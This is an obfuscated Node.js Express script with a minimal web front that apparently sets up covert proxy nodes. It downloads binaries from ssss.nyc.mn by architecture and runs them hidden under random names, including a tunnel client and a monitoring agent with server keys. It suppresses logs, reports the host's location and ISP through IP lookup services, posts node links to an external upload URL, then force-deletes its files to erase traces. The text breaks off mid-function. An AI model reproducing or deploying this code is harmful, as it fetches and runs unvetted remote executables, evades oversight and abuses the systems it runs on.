const _0x36228e=_0x5991;(function(_0x5c0937,_0x548d3f){const _0x1bb5e5=_0x5991,_0x5036dd=_0x5c0937();while(!![]){try{const _0x5780bf=-parseInt(_0x1bb5e5(0xf1))/0x1*(-parseInt(_0x1bb5e5(0x152))/0x2)+-parseInt(_0x1bb5e5(0x147))/0x3*(-parseInt(_0x1bb5e5(0x15b))/0x4)+-parseInt(_0x1bb5e5(0xcc))/0x5+parseInt(_0x1bb5e5(0x165))/0x6*(-parseInt(_0x1bb5e5(0x138))/0x7)+-parseInt(_0x1bb5e5(0xf7))/0x8+parseInt(_0x1bb5e5(0x118))/0x9*(parseInt(_0x1bb5e5(0x18d))/0xa)+-parseInt(_0x1bb5e5(0x17b))/0xb*(-parseInt(_0x1bb5e5(0xc5))/0xc);if(_0x5780bf===_0x548d3f)break;else _0x5036dd['push'](_0x5036dd['shift']());}catch(_0x236b48){_0x5036dd['push'](_0x5036dd['shift']());}}}(_0x194d,0x2546d));const express=require(_0x36228e(0xc1)),app=express(),axios=require(_0x36228e(0xc2)),os=require('os'),fs=require('fs'),path=require(_0x36228e(0x100)),{promisify}=require('util'),exec=promisify(require(_0x36228e(0x119))[_0x36228e(0xb4)]),{execSync}=require(_0x36228e(0x119)),UPLOAD_URL=process['env']['UPLOAD_URL']||'',PROJECT_URL=process[_0x36228e(0xfc)][_0x36228e(0x175)]||'',AUTO_ACCESS=process[_0x36228e(0xfc)][_0x36228e(0xbc)]||![],FILE_PATH=process[_0x36228e(0xfc)]['FILE_PATH']||_0x36228e(0x104),SUB_PATH=process['env'][_0x36228e(0xe9)]||_0x36228e(0x15a),PORT=process['env'][_0x36228e(0x101)]||process[_0x36228e(0xfc)][_0x36228e(0x11c)]||0xbb8,UUID=process['env'][_0x36228e(0x137)]||_0x36228e(0xeb),NEZHA_SERVER=process[_0x36228e(0xfc)][_0x36228e(0x13b)]||_0x36228e(0x13e),NEZHA_PORT=process['env'][_0x36228e(0xf8)]||'',NEZHA_KEY=process['env'][_0x36228e(0x169)]||'',ARGO_DOMAIN=process[_0x36228e(0xfc)][_0x36228e(0x18a)]||_0x36228e(0x111),ARGO_AUTH=process['env'][_0x36228e(0xbf)]||_0x36228e(0x10e),ARGO_PORT=process['env'][_0x36228e(0x17f)]||0x1406,CFIP=process[_0x36228e(0xfc)][_0x36228e(0xca)]||_0x36228e(0xc6),CFPORT=process[_0x36228e(0xfc)]['CFPORT']||0x1bb,NAME=process[_0x36228e(0xfc)][_0x36228e(0x17c)]||'kuan';!fs[_0x36228e(0xb9)](FILE_PATH)?(fs[_0x36228e(0xb3)](FILE_PATH),console[_0x36228e(0x15d)](FILE_PATH+_0x36228e(0x109))):console[_0x36228e(0x15d)](FILE_PATH+_0x36228e(0x11a));function generateRandomName(){const _0x57ffb0=_0x36228e,_0x199b53=_0x57ffb0(0x135);let _0x23cd9c='';for(let _0x31ad1f=0x0;_0x31ad1f<0x6;_0x31ad1f++){_0x23cd9c+=_0x199b53['charAt'](Math[_0x57ffb0(0x162)](Math[_0x57ffb0(0xf9)]()*_0x199b53[_0x57ffb0(0x108)]));}return _0x23cd9c;}const npmName=generateRandomName(),webName=generateRandomName(),botName=generateRandomName(),phpName=generateRandomName();let npmPath=path[_0x36228e(0x141)](FILE_PATH,npmName),phpPath=path[_0x36228e(0x141)](FILE_PATH,phpName),webPath=path[_0x36228e(0x141)](FILE_PATH,webName),botPath=path[_0x36228e(0x141)](FILE_PATH,botName),subPath=path[_0x36228e(0x141)](FILE_PATH,_0x36228e(0xe0)),listPath=path['join'](FILE_PATH,_0x36228e(0xfd)),bootLogPath=path[_0x36228e(0x141)](FILE_PATH,'boot.log'),configPath=path['join'](FILE_PATH,_0x36228e(0xf0));function deleteNodes(){const _0x29cd74=_0x36228e;try{if(!UPLOAD_URL)return;if(!fs[_0x29cd74(0xb9)](subPath))return;let _0x4a62b2;try{_0x4a62b2=fs['readFileSync'](subPath,_0x29cd74(0x171));}catch{return null;}const _0x30a4b8=Buffer[_0x29cd74(0x18f)](_0x4a62b2,_0x29cd74(0x134))[_0x29cd74(0x14c)]('utf-8'),_0x573e05=_0x30a4b8['split']('\x0a')['filter'](_0x4c1d5c=>/(vless|vmess|trojan|hysteria2|tuic):\/\//[_0x29cd74(0xec)](_0x4c1d5c));if(_0x573e05[_0x29cd74(0x108)]===0x0)return;const _0x1f0190={};_0x1f0190[_0x29cd74(0x115)]=_0x573e05;const _0x4a8417={};_0x4a8417[_0x29cd74(0x16f)]=_0x29cd74(0x11d);const _0x40f23d={};return _0x40f23d[_0x29cd74(0x187)]=_0x4a8417,axios[_0x29cd74(0x168)](UPLOAD_URL+'/api/delete-nodes',JSON[_0x29cd74(0xc7)](_0x1f0190),_0x40f23d)['catch'](_0x40d4a0=>{return null;}),null;}catch(_0x9bdc5c){return null;}}function _0x5991(_0x1acdb1,_0x582934){const _0x194d0a=_0x194d();return _0x5991=function(_0x599120,_0x2484cd){_0x599120=_0x599120-0xab;let _0x301ef1=_0x194d0a[_0x599120];return _0x301ef1;},_0x5991(_0x1acdb1,_0x582934);}function cleanupOldFiles(){try{const _0x572edc=fs['readdirSync'](FILE_PATH);_0x572edc['forEach'](_0x4d6edd=>{const _0x3ceebe=_0x5991,_0x5e690e=path['join'](FILE_PATH,_0x4d6edd);try{const _0x55925f=fs[_0x3ceebe(0xe5)](_0x5e690e);_0x55925f['isFile']()&&fs[_0x3ceebe(0x129)](_0x5e690e);}catch(_0x233deb){}});}catch(_0xaea3b1){}}app['get']('/',function(_0x2f3ed7,_0x14bdfd){const _0x2b6a7d=_0x36228e;_0x14bdfd[_0x2b6a7d(0x13a)](_0x2b6a7d(0x14b));});async function generateConfig(){const _0x5f6cb0=_0x36228e,_0x3d8f06={};_0x3d8f06['access']=_0x5f6cb0(0x15f),_0x3d8f06[_0x5f6cb0(0x170)]='/dev/null',_0x3d8f06['loglevel']='none';const _0x20e592={};_0x20e592['id']=UUID,_0x20e592[_0x5f6cb0(0x116)]=_0x5f6cb0(0x132);const _0x78adeb={};_0x78adeb[_0x5f6cb0(0x13d)]=0xbb9;const _0x548178={};_0x548178[_0x5f6cb0(0x100)]=_0x5f6cb0(0xe7),_0x548178[_0x5f6cb0(0x13d)]=0xbba;const _0x4c54bb={};_0x4c54bb['path']=_0x5f6cb0(0x161),_0x4c54bb[_0x5f6cb0(0x13d)]=0xbbb;const _0x376895={};_0x376895[_0x5f6cb0(0x100)]='/trojan-argo',_0x376895[_0x5f6cb0(0x13d)]=0xbbc;const _0x46a539={};_0x46a539[_0x5f6cb0(0x11b)]=[_0x20e592],_0x46a539[_0x5f6cb0(0x117)]='none',_0x46a539[_0x5f6cb0(0x127)]=[_0x78adeb,_0x548178,_0x4c54bb,_0x376895];const _0x5b2fe0={};_0x5b2fe0[_0x5f6cb0(0xd3)]='tcp';const _0x4f2c07={};_0x4f2c07[_0x5f6cb0(0x18b)]=ARGO_PORT,_0x4f2c07['protocol']=_0x5f6cb0(0xed),_0x4f2c07['settings']=_0x46a539,_0x4f2c07[_0x5f6cb0(0x183)]=_0x5b2fe0;const _0x22e0a2={};_0x22e0a2['id']=UUID;const _0x4fac85={};_0x4fac85['clients']=[_0x22e0a2],_0x4fac85[_0x5f6cb0(0x117)]=_0x5f6cb0(0x13f);const _0x326c34={};_0x326c34[_0x5f6cb0(0xd3)]=_0x5f6cb0(0xb7),_0x326c34['security']=_0x5f6cb0(0x13f);const _0x57fe60={};_0x57fe60[_0x5f6cb0(0x18b)]=0xbb9,_0x57fe60[_0x5f6cb0(0x182)]=_0x5f6cb0(0x17a),_0x57fe60[_0x5f6cb0(0xdc)]=_0x5f6cb0(0xed),_0x57fe60[_0x5f6cb0(0xff)]=_0x4fac85,_0x57fe60[_0x5f6cb0(0x183)]=_0x326c34;const _0x41a8f1={};_0x41a8f1['id']=UUID,_0x41a8f1[_0x5f6cb0(0x15e)]=0x0;const _0x1d05ab={};_0x1d05ab[_0x5f6cb0(0x11b)]=[_0x41a8f1],_0x1d05ab[_0x5f6cb0(0x117)]=_0x5f6cb0(0x13f);const _0x8ce53d={};_0x8ce53d['path']=_0x5f6cb0(0xe7);const _0x2bcc4f={};_0x2bcc4f[_0x5f6cb0(0xd3)]='ws',_0x2bcc4f['security']=_0x5f6cb0(0x13f),_0x2bcc4f[_0x5f6cb0(0x125)]=_0x8ce53d;const _0x4472a5={};_0x4472a5[_0x5f6cb0(0xdb)]=!![],_0x4472a5[_0x5f6cb0(0x188)]=[_0x5f6cb0(0x14d),_0x5f6cb0(0x189),'quic'],_0x4472a5[_0x5f6cb0(0x180)]=![];const _0x3d507e={};_0x3d507e[_0x5f6cb0(0x18b)]=0xbba,_0x3d507e[_0x5f6cb0(0x182)]=_0x5f6cb0(0x17a),_0x3d507e[_0x5f6cb0(0xdc)]=_0x5f6cb0(0xed),_0x3d507e['settings']=_0x1d05ab,_0x3d507e[_0x5f6cb0(0x183)]=_0x2bcc4f,_0x3d507e[_0x5f6cb0(0x159)]=_0x4472a5;const _0x37e0c2={};_0x37e0c2['id']=UUID,_0x37e0c2[_0x5f6cb0(0x151)]=0x0;const _0x47dfff={};_0x47dfff[_0x5f6cb0(0x11b)]=[_0x37e0c2];const _0x8ab066={};_0x8ab066['path']=_0x5f6cb0(0x161);const _0x37c0cf={};_0x37c0cf[_0x5f6cb0(0xd3)]='ws',_0x37c0cf[_0x5f6cb0(0x125)]=_0x8ab066;const _0x2a1ba5={};_0x2a1ba5[_0x5f6cb0(0xdb)]=!![],_0x2a1ba5['destOverride']=[_0x5f6cb0(0x14d),'tls','quic'],_0x2a1ba5[_0x5f6cb0(0x180)]=![];const _0x32a01a={};_0x32a01a['port']=0xbbb,_0x32a01a['listen']=_0x5f6cb0(0x17a),_0x32a01a['protocol']='vmess',_0x32a01a[_0x5f6cb0(0xff)]=_0x47dfff,_0x32a01a['streamSettings']=_0x37c0cf,_0x32a01a[_0x5f6cb0(0x159)]=_0x2a1ba5;const _0x40157c={};_0x40157c['password']=UUID;const _0x38a2b3={};_0x38a2b3[_0x5f6cb0(0x11b)]=[_0x40157c];const _0x162e3e={};_0x162e3e[_0x5f6cb0(0x100)]=_0x5f6cb0(0x184);const _0x381b9a={};_0x381b9a['network']='ws',_0x381b9a[_0x5f6cb0(0xf4)]=_0x5f6cb0(0x13f),_0x381b9a['wsSettings']=_0x162e3e;const _0x3cc1ad={};_0x3cc1ad[_0x5f6cb0(0xdb)]=!![],_0x3cc1ad[_0x5f6cb0(0x188)]=[_0x5f6cb0(0x14d),_0x5f6cb0(0x189),_0x5f6cb0(0xc0)],_0x3cc1ad[_0x5f6cb0(0x180)]=![];const _0x572526={};_0x572526['port']=0xbbc,_0x572526['listen']=_0x5f6cb0(0x17a),_0x572526['protocol']=_0x5f6cb0(0xb2),_0x572526['settings']=_0x38a2b3,_0x572526[_0x5f6cb0(0x183)]=_0x381b9a,_0x572526[_0x5f6cb0(0x159)]=_0x3cc1ad;const _0x27ee14={};_0x27ee14[_0x5f6cb0(0x131)]=['https+local://8.8.8.8/dns-query'];const _0x533b60={};_0x533b60[_0x5f6cb0(0xdc)]=_0x5f6cb0(0x16b),_0x533b60[_0x5f6cb0(0xe8)]=_0x5f6cb0(0xc8);const _0x4c383e={};_0x4c383e[_0x5f6cb0(0xdc)]=_0x5f6cb0(0x140),_0x4c383e[_0x5f6cb0(0xe8)]=_0x5f6cb0(0x158);const _0x205897={};_0x205897['log']=_0x3d8f06,_0x205897[_0x5f6cb0(0xea)]=[_0x4f2c07,_0x57fe60,_0x3d507e,_0x32a01a,_0x572526],_0x205897[_0x5f6cb0(0xd7)]=_0x27ee14,_0x205897[_0x5f6cb0(0x102)]=[_0x533b60,_0x4c383e];const _0x34fee3=_0x205897;fs['writeFileSync'](path['join'](FILE_PATH,'config.json'),JSON['stringify'](_0x34fee3,null,0x2));}function getSystemArchitecture(){const _0x489dd1=_0x36228e,_0x223899=os[_0x489dd1(0x10b)]();return _0x223899==='arm'||_0x223899==='arm64'||_0x223899===_0x489dd1(0xab)?'arm':'amd';}function downloadFile(_0xcc1ef3,_0x226a84,_0x3f907f){const _0x3584cf=_0x36228e,_0x432880=_0xcc1ef3;if(!fs['existsSync'](FILE_PATH)){const _0x46265f={};_0x46265f[_0x3584cf(0x107)]=!![],fs[_0x3584cf(0xb3)](FILE_PATH,_0x46265f);}const _0x5ea01c=fs[_0x3584cf(0xbb)](_0x432880),_0x404048={};_0x404048[_0x3584cf(0x181)]=_0x3584cf(0x103),_0x404048[_0x3584cf(0x136)]=_0x226a84,_0x404048['responseType']='stream',axios(_0x404048)[_0x3584cf(0x164)](_0x1cff40=>{const _0x20f72c=_0x3584cf;_0x1cff40['data'][_0x20f72c(0xf6)](_0x5ea01c),_0x5ea01c['on'](_0x20f72c(0xce),()=>{const _0x160dc5=_0x20f72c;_0x5ea01c[_0x160dc5(0xac)](),console['log'](_0x160dc5(0xde)+path['basename'](_0x432880)+'\x20successfully'),_0x3f907f(null,_0x432880);}),_0x5ea01c['on']('error',_0x3d392b=>{const _0xfa99e=_0x20f72c;fs['unlink'](_0x432880,()=>{});const _0x19163d=_0xfa99e(0xde)+path[_0xfa99e(0xad)](_0x432880)+_0xfa99e(0xe1)+_0x3d392b[_0xfa99e(0x139)];console[_0xfa99e(0x170)](_0x19163d),_0x3f907f(_0x19163d);});})['catch'](_0x5e515e=>{const _0x39c29a=_0x3584cf,_0x241659=_0x39c29a(0xde)+path['basename'](_0x432880)+'\x20failed:\x20'+_0x5e515e[_0x39c29a(0x139)];console[_0x39c29a(0x170)](_0x241659),_0x3f907f(_0x241659);});}async function downloadFilesAndRun(){const _0x1303be=_0x36228e,_0x12b36b=getSystemArchitecture(),_0x20fb00=getFilesForArchitecture(_0x12b36b);if(_0x20fb00['length']===0x0){console[_0x1303be(0x15d)](_0x1303be(0xe4));return;}const _0x33132d=_0x20fb00[_0x1303be(0x114)](_0x267a0d=>{return new Promise((_0x3a037c,_0x34fe28)=>{const _0x1728c0=_0x5991;downloadFile(_0x267a0d[_0x1728c0(0xf2)],_0x267a0d[_0x1728c0(0xee)],(_0x2e0eb4,_0x2514d1)=>{_0x2e0eb4?_0x34fe28(_0x2e0eb4):_0x3a037c(_0x2514d1);});});});try{await Promise['all'](_0x33132d);}catch(_0x283f0d){console['error']('Error\x20downloading\x20files:',_0x283f0d);return;}function _0x329314(_0x33faf6){const _0x5ccba2=_0x1303be,_0x1a2208=0x1fd;_0x33faf6[_0x5ccba2(0x16d)](_0x530ae4=>{const _0x2922be=_0x5ccba2;fs[_0x2922be(0xb9)](_0x530ae4)&&fs[_0x2922be(0x113)](_0x530ae4,_0x1a2208,_0x5cf5f7=>{const _0xddb4be=_0x2922be;_0x5cf5f7?console['error'](_0xddb4be(0x145)+_0x530ae4+':\x20'+_0x5cf5f7):console[_0xddb4be(0x15d)](_0xddb4be(0x166)+_0x530ae4+':\x20'+_0x1a2208[_0xddb4be(0x14c)](0x8));});});}const _0x23365d=NEZHA_PORT?[npmPath,webPath,botPath]:[phpPath,webPath,botPath];_0x329314(_0x23365d);if(NEZHA_SERVER&&NEZHA_KEY){if(!NEZHA_PORT){const _0x5cda24=NEZHA_SERVER[_0x1303be(0xb6)](':')?NEZHA_SERVER[_0x1303be(0x11e)](':')[_0x1303be(0xb8)]():'',_0x4daf0=new Set(['443',_0x1303be(0xfb),_0x1303be(0xf5),_0x1303be(0x167),_0x1303be(0x10d),_0x1303be(0xe2)]),_0x45e726=_0x4daf0[_0x1303be(0x155)](_0x5cda24)?'true':_0x1303be(0x112),_0x415d7f='\x0aclient_secret:\x20'+NEZHA_KEY+_0x1303be(0xdf)+NEZHA_SERVER+_0x1303be(0xcd)+_0x45e726+_0x1303be(0xc4)+UUID;fs[_0x1303be(0x18c)](path[_0x1303be(0x141)](FILE_PATH,'config.yaml'),_0x415d7f);const _0x561f77=_0x1303be(0xd1)+phpPath+_0x1303be(0x120)+FILE_PATH+_0x1303be(0x185);try{await exec(_0x561f77),console['log'](phpName+_0x1303be(0x130)),await new Promise(_0x2bbd9e=>setTimeout(_0x2bbd9e,0x3e8));}catch(_0x5c78c1){console[_0x1303be(0x170)]('php\x20running\x20error:\x20'+_0x5c78c1);}}else{let _0x60328='';const _0x38413c=['443',_0x1303be(0xfb),_0x1303be(0xf5),'2087','2083','2053'];_0x38413c['includes'](NEZHA_PORT)&&(_0x60328='--tls');const _0x49c2a7='nohup\x20'+npmPath+'\x20-s\x20'+NEZHA_SERVER+':'+NEZHA_PORT+_0x1303be(0x13c)+NEZHA_KEY+'\x20'+_0x60328+_0x1303be(0x12e);try{await exec(_0x49c2a7),console[_0x1303be(0x15d)](npmName+_0x1303be(0x130)),await new Promise(_0x13cfc0=>setTimeout(_0x13cfc0,0x3e8));}catch(_0x332183){console[_0x1303be(0x170)](_0x1303be(0xbd)+_0x332183);}}}else console[_0x1303be(0x15d)]('NEZHA\x20variable\x20is\x20empty,skip\x20running');const _0x187c2c=_0x1303be(0xd1)+webPath+'\x20-c\x20'+FILE_PATH+'/config.json\x20>/dev/null\x202>&1\x20&';try{await exec(_0x187c2c),console[_0x1303be(0x15d)](webName+_0x1303be(0x130)),await new Promise(_0x2ed36a=>setTimeout(_0x2ed36a,0x3e8));}catch(_0x385a48){console[_0x1303be(0x170)](_0x1303be(0xb5)+_0x385a48);}if(fs['existsSync'](botPath)){let _0x172d7b;if(ARGO_AUTH['match'](/^[A-Z0-9a-z=]{120,250}$/))_0x172d7b=_0x1303be(0x143)+ARGO_AUTH;else ARGO_AUTH['match'](/TunnelSecret/)?_0x172d7b='tunnel\x20--edge-ip-version\x20auto\x20--config\x20'+FILE_PATH+_0x1303be(0x142):_0x172d7b='tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20--logfile\x20'+FILE_PATH+_0x1303be(0x128)+ARGO_PORT;try{await exec(_0x1303be(0xd1)+botPath+'\x20'+_0x172d7b+_0x1303be(0x150)),console[_0x1303be(0x15d)](botName+_0x1303be(0x130)),await new Promise(_0x3ebf34=>setTimeout(_0x3ebf34,0x7d0));}catch(_0x2519a1){console[_0x1303be(0x170)]('Error\x20executing\x20command:\x20'+_0x2519a1);}}await new Promise(_0x596f35=>setTimeout(_0x596f35,0x1388));}function getFilesForArchitecture(_0x5c334e){const _0x5e8098=_0x36228e;let _0x2370cc;if(_0x5c334e===_0x5e8098(0xfa)){const _0x3177be={};_0x3177be[_0x5e8098(0xf2)]=webPath,_0x3177be[_0x5e8098(0xee)]='https://arm64.ssss.nyc.mn/web';const _0x42bcc0={};_0x42bcc0[_0x5e8098(0xf2)]=botPath,_0x42bcc0[_0x5e8098(0xee)]=_0x5e8098(0x190),_0x2370cc=[_0x3177be,_0x42bcc0];}else{const _0x165a72={};_0x165a72[_0x5e8098(0xf2)]=webPath,_0x165a72[_0x5e8098(0xee)]='https://amd64.ssss.nyc.mn/web';const _0x46cadb={};_0x46cadb[_0x5e8098(0xf2)]=botPath,_0x46cadb['fileUrl']='https://amd64.ssss.nyc.mn/bot',_0x2370cc=[_0x165a72,_0x46cadb];}if(NEZHA_SERVER&&NEZHA_KEY){if(NEZHA_PORT){const _0x35fca7=_0x5c334e===_0x5e8098(0xfa)?_0x5e8098(0x110):_0x5e8098(0x16e),_0x29606e={};_0x29606e[_0x5e8098(0xf2)]=npmPath,_0x29606e[_0x5e8098(0xee)]=_0x35fca7,_0x2370cc[_0x5e8098(0xbe)](_0x29606e);}else{const _0x58cc59=_0x5c334e===_0x5e8098(0xfa)?_0x5e8098(0x148):_0x5e8098(0xef),_0x3e9c85={};_0x3e9c85[_0x5e8098(0xf2)]=phpPath,_0x3e9c85[_0x5e8098(0xee)]=_0x58cc59,_0x2370cc['unshift'](_0x3e9c85);}}return _0x2370cc;}function argoType(){const _0x576eec=_0x36228e;if(!ARGO_AUTH||!ARGO_DOMAIN){console[_0x576eec(0x15d)](_0x576eec(0x14a));return;}if(ARGO_AUTH[_0x576eec(0xb6)]('TunnelSecret')){fs[_0x576eec(0x18c)](path[_0x576eec(0x141)](FILE_PATH,_0x576eec(0xf3)),ARGO_AUTH);const _0x3f3b12=_0x576eec(0x177)+ARGO_AUTH['split']('\x22')[0xb]+_0x576eec(0xda)+path['join'](FILE_PATH,_0x576eec(0xf3))+'\x0a\x20\x20protocol:\x20http2\x0a\x20\x20\x0a\x20\x20ingress:\x0a\x20\x20\x20\x20-\x20hostname:\x20'+ARGO_DOMAIN+'\x0a\x20\x20\x20\x20\x20\x20service:\x20http://localhost:'+ARGO_PORT+_0x576eec(0xe3);fs[_0x576eec(0x18c)](path[_0x576eec(0x141)](FILE_PATH,'tunnel.yml'),_0x3f3b12);}else console['log']('ARGO_AUTH\x20mismatch\x20TunnelSecret,use\x20token\x20connect\x20to\x20tunnel');}async function extractDomains(){const _0x4ef6da=_0x36228e;let _0x1b1cee;if(ARGO_AUTH&&ARGO_DOMAIN)_0x1b1cee=ARGO_DOMAIN,console[_0x4ef6da(0x15d)](_0x4ef6da(0x105),_0x1b1cee),await _0x320c7a(_0x1b1cee);else try{const _0x569273=fs[_0x4ef6da(0x126)](path[_0x4ef6da(0x141)](FILE_PATH,'boot.log'),'utf-8'),_0x562c2d=_0x569273[_0x4ef6da(0x11e)]('\x0a'),_0x4db110=[];_0x562c2d[_0x4ef6da(0x16d)](_0x3009f7=>{const _0x529c61=_0x4ef6da,_0x55391c=_0x3009f7[_0x529c61(0xd0)](/https?:\/\/([^ ]*trycloudflare\.com)\/?/);if(_0x55391c){const _0x529614=_0x55391c[0x1];_0x4db110[_0x529c61(0x17d)](_0x529614);}});if(_0x4db110['length']>0x0)_0x1b1cee=_0x4db110[0x0],console[_0x4ef6da(0x15d)](_0x4ef6da(0x18e),_0x1b1cee),await _0x320c7a(_0x1b1cee);else{console['log']('ArgoDomain\x20not\x20found,\x20re-running\x20bot\x20to\x20obtain\x20ArgoDomain'),fs[_0x4ef6da(0x129)](path[_0x4ef6da(0x141)](FILE_PATH,_0x4ef6da(0xd2)));async function _0x5c239c(){const _0x4cfec7=_0x4ef6da;try{process[_0x4cfec7(0x156)]===_0x4cfec7(0xdd)?await exec(_0x4cfec7(0x144)+botName+_0x4cfec7(0xc9)):await exec(_0x4cfec7(0x17e)+botName['charAt'](0x0)+']'+botName[_0x4cfec7(0xd5)](0x1)+_0x4cfec7(0x160));}catch(_0x2549ea){}}_0x5c239c(),await new Promise(_0x26716c=>setTimeout(_0x26716c,0xbb8));const _0x4212a1=_0x4ef6da(0xcb)+FILE_PATH+_0x4ef6da(0x128)+ARGO_PORT;try{await exec('nohup\x20'+botPath+'\x20'+_0x4212a1+_0x4ef6da(0x150)),console[_0x4ef6da(0x15d)](botName+'\x20is\x20running'),await new Promise(_0x12bff1=>setTimeout(_0x12bff1,0xbb8)),await extractDomains();}catch(_0x16ff35){console['error']('Error\x20executing\x20command:\x20'+_0x16ff35);}}}catch(_0x15f19f){console[_0x4ef6da(0x170)]('Error\x20reading\x20boot.log:',_0x15f19f);}async function _0x106f61(){const _0x5abd82=_0x4ef6da;try{const _0x4119eb={};_0x4119eb[_0x5abd82(0x123)]=0xbb8;const _0x70c863=await axios['get']('https://ipapi.co/json/',_0x4119eb);if(_0x70c863[_0x5abd82(0xaf)]&&_0x70c863[_0x5abd82(0xaf)][_0x5abd82(0x106)]&&_0x70c863[_0x5abd82(0xaf)]['org'])return _0x70c863[_0x5abd82(0xaf)][_0x5abd82(0x106)]+'_'+_0x70c863[_0x5abd82(0xaf)][_0x5abd82(0xb0)];}catch(_0x3d0b95){try{const _0x452f20={};_0x452f20[_0x5abd82(0x123)]=0xbb8;const _0x3b8a4a=await axios[_0x5abd82(0x103)]('http://ip-api.com/json/',_0x452f20);if(_0x3b8a4a['data']&&_0x3b8a4a[_0x5abd82(0xaf)][_0x5abd82(0x12d)]===_0x5abd82(0x16c)&&_0x3b8a4a[_0x5abd82(0xaf)][_0x5abd82(0x121)]&&_0x3b8a4a[_0x5abd82(0xaf)][_0x5abd82(0xb0)])return _0x3b8a4a['data'][_0x5abd82(0x121)]+'_'+_0x3b8a4a[_0x5abd82(0xaf)]['org'];}catch(_0x38376c){}}return'Unknown';}async function _0x320c7a(_0x50cd36){const _0x3ee721=await _0x106f61(),_0x5520c2=NAME?NAME+'-'+_0x3ee721:_0x3ee721;return new Promise(_0x59f9df=>{setTimeout(()=>{const _0x5b38ca=_0x5991,_0x1fa677={};_0x1fa677['v']='2',_0x1fa677['ps']=''+_0x5520c2,_0x1fa677[_0x5b38ca(0xd9)]=CFIP,_0x1fa677[_0x5b38ca(0x18b)]=CFPORT,_0x1fa677['id']=UUID,_0x1fa677[_0x5b38ca(0x154)]='0',_0x1fa677[_0x5b38ca(0x178)]=_0x5b38ca(0x13f),_0x1fa677[_0x5b38ca(0x146)]='ws',_0x1fa677[_0x5b38ca(0x179)]=_0x5b38ca(0x13f),_0x1fa677[_0x5b38ca(0x10a)]=_0x50cd36,_0x1fa677[_0x5b38ca(0x100)]=_0x5b38ca(0x12f),_0x1fa677[_0x5b38ca(0x189)]='tls',_0x1fa677[_0x5b38ca(0x153)]=_0x50cd36,_0x1fa677[_0x5b38ca(0x12c)]='',_0x1fa677['fp']=_0x5b38ca(0x149);const _0x34b3ee=_0x1fa677,_0x4b3b1a='\x0avless://'+UUID+'@'+CFIP+':'+CFPORT+_0x5b38ca(0x10c)+_0x50cd36+_0x5b38ca(0x172)+_0x50cd36+_0x5b38ca(0x176)+_0x5520c2+_0x5b38ca(0xb1)+Buffer[_0x5b38ca(0x18f)](JSON[_0x5b38ca(0xc7)](_0x34b3ee))[_0x5b38ca(0x14c)](_0x5b38ca(0x134))+_0x5b38ca(0x174)+UUID+'@'+CFIP+':'+CFPORT+_0x5b38ca(0x173)+_0x50cd36+_0x5b38ca(0x172)+_0x50cd36+_0x5b38ca(0x186)+_0x5520c2+_0x5b38ca(0x122);console['log'](Buffer[_0x5b38ca(0x18f)](_0x4b3b1a)[_0x5b38ca(0x14c)](_0x5b38ca(0x134))),fs[_0x5b38ca(0x18c)](subPath,Buffer[_0x5b38ca(0x18f)](_0x4b3b1a)[_0x5b38ca(0x14c)](_0x5b38ca(0x134))),console[_0x5b38ca(0x15d)](FILE_PATH+_0x5b38ca(0xba)),uploadNodes(),app[_0x5b38ca(0x103)]('/'+SUB_PATH,(_0x4e7b13,_0x203d2c)=>{const _0x1a4b7e=_0x5b38ca,_0x52c5f3=Buffer[_0x1a4b7e(0x18f)](_0x4b3b1a)['toString'](_0x1a4b7e(0x134));_0x203d2c['set'](_0x1a4b7e(0x16f),_0x1a4b7e(0xe6)),_0x203d2c[_0x1a4b7e(0x13a)](_0x52c5f3);}),_0x59f9df(_0x4b3b1a);},0x7d0);});}}async function uploadNodes(){const _0x1f6cc3=_0x36228e;if(UPLOAD_URL&&PROJECT_URL){const _0xe725f=PROJECT_URL+'/'+SUB_PATH,_0x363332={};_0x363332[_0x1f6cc3(0xfe)]=[_0xe725f];const _0x481aba=_0x363332;try{const _0x2f2d61={};_0x2f2d61['Content-Type']=_0x1f6cc3(0x11d);const _0x3ad187={};_0x3ad187['headers']=_0x2f2d61;const _0x47cc95=await axios[_0x1f6cc3(0x168)](UPLOAD_URL+_0x1f6cc3(0xd6),_0x481aba,_0x3ad187);return _0x47cc95&&_0x47cc95[_0x1f6cc3(0x12d)]===0xc8?(console['log'](_0x1f6cc3(0x12b)),_0x47cc95):null;}catch(_0x13b7a7){if(_0x13b7a7[_0x1f6cc3(0xcf)]){if(_0x13b7a7[_0x1f6cc3(0xcf)][_0x1f6cc3(0x12d)]===0x190){}}}}else{if(UPLOAD_URL){if(!fs[_0x1f6cc3(0xb9)](listPath))return;const _0x5dec8=fs[_0x1f6cc3(0x126)](listPath,'utf-8'),_0x2c546d=_0x5dec8[_0x1f6cc3(0x11e)]('\x0a')['filter'](_0x56c450=>/(vless|vmess|trojan|hysteria2|tuic):\/\//['test'](_0x56c450));if(_0x2c546d[_0x1f6cc3(0x108)]===0x0)return;const _0x194910={};_0x194910[_0x1f6cc3(0x115)]=_0x2c546d;const _0x4a5a79=JSON[_0x1f6cc3(0xc7)](_0x194910);try{const _0x4b515d={};_0x4b515d[_0x1f6cc3(0x16f)]='application/json';const _0x334af2={};_0x334af2[_0x1f6cc3(0x187)]=_0x4b515d;const _0x8a7cfe=await axios[_0x1f6cc3(0x168)](UPLOAD_URL+'/api/add-nodes',_0x4a5a79,_0x334af2);return _0x8a7cfe&&_0x8a7cfe[_0x1f6cc3(0x12d)]===0xc8?(console['log'](_0x1f6cc3(0xd8)),_0x8a7cfe):null;}catch(_0x119510){return null;}}else return;}}function cleanFiles(){setTimeout(()=>{const _0x5dfef4=_0x5991,_0x525161=[bootLogPath,configPath,webPath,botPath];if(NEZHA_PORT)_0x525161[_0x5dfef4(0x17d)](npmPath);else NEZHA_SERVER&&NEZHA_KEY&&_0x525161[_0x5dfef4(0x17d)](phpPath);process[_0x5dfef4(0x156)]===_0x5dfef4(0xdd)?exec('del\x20/f\x20/q\x20'+_0x525161[_0x5dfef4(0x141)]('\x20')+_0x5dfef4(0x15c),_0x1047a6=>{const _0x362287=_0x5dfef4;console[_0x362287(0x12a)](),console['log'](_0x362287(0x124)),console[_0x362287(0x15d)](_0x362287(0xd4));}):exec(_0x5dfef4(0x157)+_0x525161[_0x5dfef4(0x141)]('\x20')+_0x5dfef4(0x11f),_0x35ff01=>{const _0x6e8af3=_0x5dfef4;console[_0x6e8af3(0x12a)](),console[_0x6e8af3(0x15d)]('App\x20is\x20running'),console['log'](_0x6e8af3(0xd4));});},0x15f90);}cleanFiles();async function AddVisitTask(){const 